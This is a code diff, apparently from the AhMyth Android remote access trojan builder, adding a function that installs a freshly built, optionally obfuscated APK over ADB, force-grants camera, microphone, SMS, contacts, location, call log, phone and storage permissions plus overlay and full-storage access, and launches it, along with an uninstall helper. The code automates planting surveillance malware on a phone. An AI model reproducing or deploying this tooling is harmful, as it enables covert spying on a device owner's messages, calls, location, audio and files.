@@ -1714,6 +1714,83 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
             }
         });
     };
+
+    // Install and Run on Device
+    $appCtrl.installAndRun = async () => {
+        if (!$appCtrl.lastBuiltApkPath) {
+            $appCtrl.Log('[✗] No APK built yet', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+
+        const apkPath = $appCtrl.lastBuiltApkPath;
+        const packageName = $appCtrl.obfuscationOptions.customPackage || 'ahmyth.mine.king.ahmyth';
+        
+        $appCtrl.Log('[→] Checking device connection...', CONSTANTS.logStatus.INFO);
+        
+        try {
+            // Check devices
+            const devices = await exec('adb devices');
+            if (!devices.stdout.includes('device') || devices.stdout.trim().split('\n').length <= 1) {
+                $appCtrl.Log('[✗] No device connected via ADB', CONSTANTS.logStatus.FAIL);
+                return;
+            }
+
+            $appCtrl.Log(`[→] Installing APK: ${path.basename(apkPath)}...`, CONSTANTS.logStatus.INFO);
+            await exec(`adb install -r -g "${apkPath}"`);
+            $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
+
+            // Grant permissions
+            $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
+            const permissions = [
+                'android.permission.CAMERA',
+                'android.permission.RECORD_AUDIO',
+                'android.permission.READ_CONTACTS',
+                'android.permission.READ_SMS',
+                'android.permission.ACCESS_FINE_LOCATION',
+                'android.permission.READ_CALL_LOG',
+                'android.permission.READ_EXTERNAL_STORAGE',
+                'android.permission.WRITE_EXTERNAL_STORAGE',
+                'android.permission.READ_PHONE_STATE',
+                'android.permission.CALL_PHONE'
+            ];
+
+            for (const perm of permissions) {
+                try {
+                    await exec(`adb shell pm grant ${packageName} ${perm}`);
+                } catch (e) { /* Ignore if already granted or failed */ }
+            }
+            
+            // Special permissions
+            try {
+                await exec(`adb shell appops set ${packageName} SYSTEM_ALERT_WINDOW allow`);
+                await exec(`adb shell appops set ${packageName} MANAGE_EXTERNAL_STORAGE allow`);
+            } catch (e) {}
+
+            $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);
+
+            // Run App
+            $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
+            await exec(`adb shell am start -n ${packageName}/${packageName}.MainActivity`);
+            $appCtrl.Log('[✓] App launched!', CONSTANTS.logStatus.SUCCESS);
+
+        } catch (error) {
+            $appCtrl.Log(`[✗] Operation failed: ${error.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    };
+
+    // Uninstall App
+    $appCtrl.uninstallApp = async () => {
+        const packageName = $appCtrl.obfuscationOptions.customPackage || 'ahmyth.mine.king.ahmyth';
+        if (confirm(`Are you sure you want to uninstall ${packageName}?`)) {
+            try {
+                $appCtrl.Log(`[→] Uninstalling ${packageName}...`, CONSTANTS.logStatus.INFO);
+                await exec(`adb uninstall ${packageName}`);
+                $appCtrl.Log('[✓] Uninstalled successfully', CONSTANTS.logStatus.SUCCESS);
+            } catch (error) {
+                $appCtrl.Log(`[✗] Uninstall failed: ${error.message}`, CONSTANTS.logStatus.FAIL);
+            }
+        }
+    };
 });
 
 // Function to check if Java version 11 is installed
